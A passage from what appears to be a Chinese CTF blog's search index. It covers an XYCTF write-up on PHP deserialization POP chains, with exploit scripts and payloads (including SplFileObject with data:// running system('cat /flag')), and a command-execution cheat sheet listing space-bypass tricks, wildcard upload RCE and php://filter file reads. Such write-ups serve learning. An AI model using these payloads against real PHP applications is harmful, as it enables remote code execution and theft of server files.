<span class="hljs-variable">$pop</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>    <span class="hljs-variable">$pop</span>-&gt;token=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pop</span>-&gt;<span class="hljs-title function_ invoke__">login</span>()) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>这题第一层其实是原题，是ctfshow上面的，<a href="https://blog.csdn.net/Kracxi/article/details/122887126">链接</a>，由于md5(mt_rand())在变化而且很难爆破，只要让token&#x3D;password就行我们写个代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br><span class="hljs-variable">$a</span>-&gt;password=&amp;<span class="hljs-variable">$a</span>-&gt;token;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf/serialize.png" alt="serialize"></p><p>进入第二层，贴个源码（真的烦啊.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mack-&gt;<span class="hljs-title function_ invoke__">nonExistentMethod</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$luo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;o.O&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;luo;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$wang1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$wang1</span>,<span class="hljs-variable">$wang2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag2</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chen</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$this</span>-&gt;lao-&gt;chen) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-variable language_">$this</span>-&gt;lao-&gt;chen;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name!=<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-variable language_">$this</span>-&gt;num!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>静下来分析以下其实第二层也不算太难的还是从后往前推，关键应该在echo $flag2这里</p><p>调用一个不存在的函数可以调用__call()，也就是$this-&gt;mack-&gt;nonExistentMethod();</p><p>__invoke()把对象当成函数就可以调用，return $function()可以解决这个问题。</p><p>__get调用不存在的属性，return is_null($this-&gt;lao-&gt;chen) ? “” : $this-&gt;lao-&gt;chen;可以解决。</p><p>__toString有echo就行，调用__unserialize($data) ,里面的，值得注意的是我看了其他师傅的wp，好像因为php版本问题，这里不能用，下面的wakeup也是可以调用的，分析完我罗列一下。</p><p>E::__wakeup-&gt;D::__tostring-&gt;B::__get-&gt;A::__invoke-&gt;C::__call;</p><p>我们尝试写一下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mack</span>;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$luo</span>; <br>        &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>       <span class="hljs-keyword">public</span> <span class="hljs-variable">$wang1</span>; <br>       &#125;<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$lao</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$chen</span>; <br>        &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span> </span>&#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>; <br>            &#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> E;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> D;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> B;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> A;<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> C;<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;lao=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;luo=<span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$d</span>-&gt;mack=<span class="hljs-variable">$e</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf/ser1.png" alt="ser1"></p><p>写完一遍发现也不是很难，看看第三层，先贴代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Liu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$upsw1ng</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$Liu</span>, <span class="hljs-variable">$T1ng</span>, <span class="hljs-variable">$upsw1ng</span> = Showmaker</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Liu = <span class="hljs-variable">$Liu</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;T1ng = <span class="hljs-variable">$T1ng</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;upsw1ng = <span class="hljs-variable">$upsw1ng</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$crypto0</span>, <span class="hljs-variable">$adwa</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;crypto0 = <span class="hljs-variable">$crypto0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XYCTF</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="hljs-string">&#x27;dev1l&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fpclose</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&quot;Crypto0&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$KickyMu</span>, <span class="hljs-variable">$fpclose</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;KickyMu = <span class="hljs-variable">$KickyMu</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;fpclose = <span class="hljs-variable">$fpclose</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XY</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;N1ght == <span class="hljs-string">&#x27;oSthing&#x27;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;WOW, You web is really good!!!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;X&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Y&#x27;</span>]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;KickyMu-&gt;<span class="hljs-title function_ invoke__">XYCTF</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">XY</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;CTF&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;CTF&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>好多出题人被扒上面啊，该打呜呜呜。</p><p>看了一遍好难，原生链和利用链，跟着师傅的思路跑一遍。</p><p>？写多了我感觉也不是太难了，上代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Liu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$upsw1ng</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fpclose</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&quot;Crypto0&quot;</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO3</span>;<br><span class="hljs-variable">$a</span>-&gt;N1ght=<span class="hljs-string">&#x27;oSthing&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO2</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO1</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa-&gt;T1ng=<span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>这里注意有private，需要%00填上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">$this-&gt;adwa-&gt;crypto0 != &#x27;dev1l&#x27;的原因还需要添s:7:&quot;crypto0&quot;;s:5:&quot;dev1l&quot;;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?CTF=O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO3&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;KickyMu&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO2&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;crypto0&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;adwa&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO1&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Liu&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;T1ng&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;yuroandCMD258&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;%00XYCTFNO1%00upsw1ng&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;crypto0&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;dev1l&quot;</span>;&#125;&#125;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;fpclose&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;N1ght&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;oSthing&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>post里面y肯定是构造伪协议这没什么问题，x的话我就不太懂了，<a href="https://blog.csdn.net/weixin_39534780/article/details/115514259?ops_request_misc=&request_id=&biz_id=102&utm_term=SplFileObject&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-115514259.nonecase&spm=1018.2226.3001.4187">文章</a>，简要了解一下，类似file_get_contents，这里前面有new,可以用Splfileobject使用，确实长知识了。</p><p><img src="/../images/xyctf/ser2.png" alt="ser2"></p><p><img src="/../images/xyctf/ser3.png" alt="ser3"></p><h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$aa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$bb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>((<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$aa</span>))-&gt;<span class="hljs-variable">$c</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$bb</span>))-&gt;<span class="hljs-variable">$c</span>());<br></code></pre></td></tr></table></figure><p>看了一下wp也是考的Spl原生类+伪协议利用，确实之前不知道这些。</p><p>?a&#x3D;SplFileObject&amp;aa&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,system&amp;c&#x3D;__toString&amp;b&#x3D;SplFileObject&amp;bb&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,cat%20&#x2F;flag</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>没遇过的知识点，可以看看，<a href="https://xz.aliyun.com/t/14061?time__1311=mqmx9DBG0Qi=oGNDQiiQGkfD8QaR10B4OiD&alichlgref=https://cn.bing.com/">前置知识</a></p><p>之后可以看官p,太难了技术有限。就到这里了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>复盘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web之命令执行(持续更新)</title>
    <link href="/2024/04/13/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/04/13/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h1><p>system<br>passthru<br>exec<br>show_source</p><h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><p>%09(tab)<br>$IFS$9<br>${IFS}<br>$IFS%09(tab)<br>&lt;(不能和通配符一起使用)<br>&lt;&gt;(不能和通配符一起使用)<br>%20(space)</p><h1 id="无字符绕过"><a href="#无字符绕过" class="headerlink" title="无字符绕过"></a>无字符绕过</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>第一种姿势利用poc文件上传，通过.&#x2F;tmp&#x2F;php??????这样的形式来写<br>通配符除了？和*之外还有[^x]可以使用，一般默认上传的最后一个字母是大写字母，可以用[ @-[ ]进行遍历<br>然后进行修改内容，可以先尝试whoami看看是否RCE成功，需要在#！&#x2F;bin&#x2F;sh下进行(我暂时还不太懂);然后ls看看，最后cat或者tac flag ,直接不行的情况下，可以在默认目录下(var&#x2F;www&#x2F;html&#x2F;XXX)<br>附上poc代码:</p><p><img src="/../../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/poc.png"></p><p>算是第一次接触到这种姿势，记录一下.</p><h2 id="构造数字"><a href="#构造数字" class="headerlink" title="$()构造数字"></a>$()构造数字</h2><p>在linux中,echo $(())默认为0，取反就是-1，也就是$((~ $(())))&#x3D;-1；<br>因为是默认相加构造负数最后整体相加即可。</p><h1 id="include包含"><a href="#include包含" class="headerlink" title="include包含"></a>include包含</h1><p>include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>include函数传入的参数不能执行系统命令，需要使用伪协议</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
